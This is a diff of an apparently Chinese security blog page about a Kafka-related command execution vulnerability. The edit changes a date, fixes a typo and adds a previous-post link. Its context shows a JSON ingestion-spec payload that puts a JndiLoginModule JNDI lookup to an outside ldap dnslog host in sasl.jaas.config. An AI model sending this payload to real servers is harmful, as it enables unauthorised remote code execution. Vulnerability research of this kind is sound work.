@@ -192,7 +192,7 @@
     
         <span class="article-update-date article-meta-item">
         <i class="fas fa-file-pen"></i>&nbsp;
-        <span class="pc">2023-04-24 22:39:34</span>
+        <span class="pc">2023-04-24 22:43:15</span>
     </span>
     
     
@@ -345,7 +345,7 @@
                 ></p>
 <h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>精简后payload</p>
 <p>bootstrap.servers 可为任意值</p>
-<p>sasl.jaas.config  值参数上一篇</p>
+<p>sasl.jaas.config  值参考上一篇</p>
 <p>topic  不为空</p>
 <p>dataSchema 不为空</p>
 <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;kafka&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;spec&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;kafka&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;ioConfig&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;kafka&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;consumerProperties&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;bootstrap.servers&quot;</span><span class="punctuation">:</span><span class="string">&quot;6.6.6.6:9092&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;security.protocol&quot;</span><span class="punctuation">:</span><span class="string">&quot;SASL_SSL&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;sasl.jaas.config&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.security.auth.module.JndiLoginModule required user.provider.url=\&quot;ldap://lc7g01.dnslog.cn\&quot; useFirstPass=\&quot;true\&quot; serviceName=\&quot;x\&quot; group.provider.url=\&quot;xxx\&quot;;&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;topic&quot;</span><span class="punctuation">:</span><span class="string">&quot;any&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;dataSchema&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;dataSource&quot;</span><span class="punctuation">:</span><span class="string">&quot;sample&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;timestampSpec&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;column&quot;</span><span class="punctuation">:</span><span class="string">&quot;!!!_no_such_column_!!!&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;missingValue&quot;</span><span class="punctuation">:</span><span class="string">&quot;1970-01-01T00:00:00Z&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;dimensionsSpec&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line"></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;granularitySpec&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;rollup&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
@@ -393,6 +393,21 @@
 
             
                 <div class="article-nav">
+                    
+                        <div class="article-prev">
+                            <a class="prev"
+                               rel="prev"
+                               href="/2023/04/24/Kafka%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E4%B8%80/"
+                            >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                                <span class="title flex-center">
+                                <span class="post-nav-title-item">Kafka命令执行漏洞一</span>
+                                <span class="post-nav-item">上一篇</span>
+                            </span>
+                            </a>
+                        </div>
                     
                     
                         <div class="article-next">
